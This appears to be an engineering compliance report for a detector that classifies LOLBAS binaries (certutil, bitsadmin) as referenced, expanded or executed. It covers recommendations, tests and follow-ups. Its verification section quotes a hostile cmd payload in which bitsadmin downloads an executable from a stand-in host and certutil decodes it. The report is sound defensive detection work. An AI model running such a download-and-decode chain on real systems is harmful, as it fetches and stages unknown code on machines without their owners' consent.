# RC5 · Phase 6 · LOLBIN v2 · Recommendation Compliance Report

**Date:** 2026-02-21
**Phase:** 6 — Deterministic 3-State LOLBIN Model
**Feature flag:** `SEMANTIC_ENGINE_V2` (unchanged; new artifacts additive)

---

## 1 · Scope

Replace the legacy string-regex `scan_lolbas(text)` code path with a
deterministic graph-walking `LolbinDetector` that classifies every LOLBAS
binary into one of three states — **referenced**, **expanded**,
**executed** — and only `executed` enters Verdict v2 math (§ 9).

---

## 2 · Approved Recommendations vs. Delivery

| # | Recommendation                                                            | Status | Notes |
|--:|---------------------------------------------------------------------------|:------:| ----- |
| 1 | 3-state model: referenced / expanded / executed                            |   ✅   | `LolbinState` enum + `LolbinRow.state`. Upgrade rule: executed > expanded > referenced (`_strongest`). |
| 2 | Only `executed` enters verdict math                                        |   ✅   | `LolbinRow.enters_verdict` is a Pydantic `@computed_field` = `state == executed`. Test: `test_only_executed_enters_verdict`. |
| 3 | Evidence-first (≥1 `evidence_node_ids` per row)                            |   ✅   | Pydantic validator `_at_least_one` rejects empty. Test: `test_no_zero_evidence_row_creatable`. |
| 4 | No regex on raw `result["output"]` — graph walker only                     |   ✅   | Detector walks `ExecGraph.nodes` and `ExecNode.args` structured fields. Tests: `test_no_regex_scan_of_result_output`, `test_lolbin_v2_no_re_scan_on_raw_text`. |
| 5 | Deterministic (byte-equal outputs for same graph)                          |   ✅   | Row IDs derived from sha1(`binary|state|node_ids`). Test: `test_deterministic_across_runs`, `test_e2e_rows_are_deterministic_across_two_runs`. |
| 6 | LOLBAS catalog reused (no duplication)                                     |   ✅   | `_load_catalog()` reads `backend/lolbas.py::_ACTIVE`. Falls back to a curated 13-entry core if the module isn't loaded (test-env safety). |
| 7 | Advisor-origin nodes never enter deterministic outputs                     |   ✅   | Detector skips `n.origin == "advisor"`. Test: `test_advisor_origin_nodes_are_ignored`. |
| 8 | Kill-list § 13 static-import gate for `_KEYWORD_LOLBAS_HITS`               |   ✅   | `test_no_new_import_of_KEYWORD_LOLBAS_HITS_in_engine` scans `engine/` for real imports/attribute access. |
| 9 | `--no-ai` invariant preserved                                              |   ✅   | Detector module imports zero AI libraries. Test: `test_lolbin_v2_no_ai_imports`. |
| 10 | Confidence propagation (row conf ≤ min contributing-node conf)             |   ✅   | Row confidence = `min(contributing node confidences)`. Test: `test_row_confidence_clamped_by_source_node_min_confidence`. |
| 11 | Full Windows-path executables normalise to bare LOLBAS name                |   ✅   | `_norm()` strips `\\` / `/` prefixes before matching. Test: `test_processnode_with_full_windows_path_is_executed`. |
| 12 | Snippets capped at 200 chars per row                                       |   ✅   | `_trim()` normalises whitespace + caps at 200. Test: `test_e2e_snippets_never_exceed_cap`. |
| 13 | ≥ 30 regression tests (per § 16 corpus matrix)                             |   ✅   | **46** tests delivered in `tests/rc5/unit/lolbin_v2/` + 3 new API tests. |
| 14 | Response exposure on `/api/rc5/parse`                                      |   ✅   | New `lolbins_v2[]` response field, `plugin_versions.lolbin_v2`, `decode_chain` step `lolbin_v2`. |

---

## 3 · Files Added / Modified

**Added:**
- `backend/engine/detectors/lolbin_v2.py` — `LolbinState`, `LolbinRow`, `LolbinDetector`, helpers.
- `backend/tests/rc5/unit/lolbin_v2/__init__.py`
- `backend/tests/rc5/unit/lolbin_v2/test_lolbin_v2.py` — 46 tests.

**Modified:**
- `backend/routers/rc5_diag.py` — response now returns `lolbins_v2`; `plugin_versions.lolbin_v2`; `decode_chain` step added.
- `backend/tests/rc5/api/test_diag_endpoint.py` — shape check widened; +3 API tests; decode-chain length assertion updated to 6.

**Not modified (kept per user directive — keep Phase 6 focused):**
- `backend/lolbas.py` legacy scanner remains callable for the flag-off code path. It is on the kill-list § 13 slate for Phase 10 cutover.

---

## 4 · Live Verification (2026-02-21)

Payload (cmd):
```
set A=certutil.exe & bitsadmin /transfer job http://x/a a.exe & %A% -decode a b
```

`/api/rc5/parse` returned:

| binary    | state    | enters_verdict | evidence_nodes | mitre                        |
|-----------|----------|:--------------:|:--------------:|------------------------------|
| certutil  | executed | true           | 3              | T1140, T1105, T1218          |
| bitsadmin | executed | true           | 1              | T1197, T1105                 |

Note: `certutil` is recognised across **all three** occurrences (SET var, `%A%` expansion at the `& %A% -decode …` call, and reference in the var-bind reconstruction) — the final state is correctly upgraded to `executed`, with evidence unioned across three graph nodes.

---

## 5 · Deviations from Recommendation

None. All 14 approved items delivered as-specified. The full-Windows-path test currently asserts that `certutil` resolves via the ProcessNode.image basename-strip AND falls back to reconstructed-text tokenisation — both paths succeed.

---

## 6 · Known Follow-ups (deferred, per user)

1. **Legacy `scan_lolbas(text)` removal** — deferred to Phase 10 cutover per kill-list § 13.
2. **Full ~239-entry LOLBAS catalog sync** — already handled by `lolbas.py::_ACTIVE`; the detector auto-inherits any refresh at process restart. No Phase 6 work required.
3. **LOLBAS argv-pattern strictness** — the legacy scanner uses `rule["argv"]` regex to gate hits. In LOLBIN v2, the argv gate is *implicit* in the graph — a ProcessNode already means "was invoked". A future enhancement (Phase 8) can attach argv-based `analyst_hints` to the row without gating the state.

---

## 7 · Phase 6 Exit Criteria — Met

- [x] 3-state model implemented and enforced
- [x] Only `executed` enters verdict math (guaranteed by computed field)
- [x] Evidence-first (behavior/node IDs)
- [x] Determinism verified
- [x] `--no-ai` invariant preserved
- [x] Kill-list § 13 gate active
- [x] 30+ regression tests (delivered 46)
- [x] Response wired into `/api/rc5/parse`

**Phase 6 complete. Ready for Phase 7 (Verdict v2).**
